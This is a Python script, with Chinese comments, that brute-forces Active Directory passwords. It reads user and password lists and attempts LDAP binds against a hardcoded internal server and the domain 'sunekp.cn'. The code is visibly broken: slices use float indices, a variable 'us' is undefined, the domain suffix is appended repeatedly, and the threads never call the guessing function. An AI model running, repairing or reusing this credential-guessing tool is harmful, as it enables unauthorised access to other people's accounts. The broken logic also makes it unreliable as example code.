# -*- coding: utf-8 -*-
# import class and constants
from ldap3 import Server, Connection, ALL
import threading
import time

# define the server
s = Server('192.168.100.192', get_info=ALL)  # define an unsecure LDAP server, requesting info on DSE and schema
count=0
#读入users.txt文件并分成两个列表为多线程做准备
with open('users.txt','r') as f:
    line = f.read().strip()
    users = line.split("\n")         # 以换行符分隔
    print(users)
for i in range(0, len(users)):
    print(users[i])
f.close()
users1=users[0:len(users)/2]
users2=users[len(users)/2:len(users)]
print(users1)
print(users2)
#读入密码文件
with open('passwords.txt','r') as f:
    line = f.read().strip()
    passwords = line.split("\n")         # 以换行符分隔
    print(passwords)
for k in range(0, len(passwords)):
    print(passwords[k])
f.close()


#定义多线程比对算法 
def testADpassword(users,passwords):
    for i in range(0,len(users)):
        for k in range(0,len(passwords)):
        # print (users[i],passwords[k])
        #testADpassword(users[i],passwords[k])
        #ps='sun.123'
        #us='lainanfei@sunekp.cn'
        # define the connection
            global count
            users[i]=users[i] + "@sunekp.cn"    
            c = Connection(s, user=users[i], password=passwords[k])
            # perform the Bind operation
            if not c.bind():
            #print('error in bind', c.result)
                print("")   
            else:
                print("you bind success!your name is:",us)
                c.unbind()
                count=count+1
    return count
        


exitFlag = 0

class myThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
    def run(self):
        print ("开始线程：" + self.name)
        print_time(self.name, self.counter, 5)
        print ("退出线程：" + self.name)

def print_time(threadName, delay, counter):
    while counter:
        if exitFlag:
            threadName.exit()
        time.sleep(delay)
        print ("%s: %s" % (threadName, time.ctime(time.time())))
        counter -= 1

# 创建新线程
thread1 = myThread(1, "Thread-1", 1)
thread2 = myThread(2, "Thread-2", 2)

# 开启新线程
thread1.start()
thread2.start()
thread1.join()
thread2.join()
print ("退出主线程")


print(count)

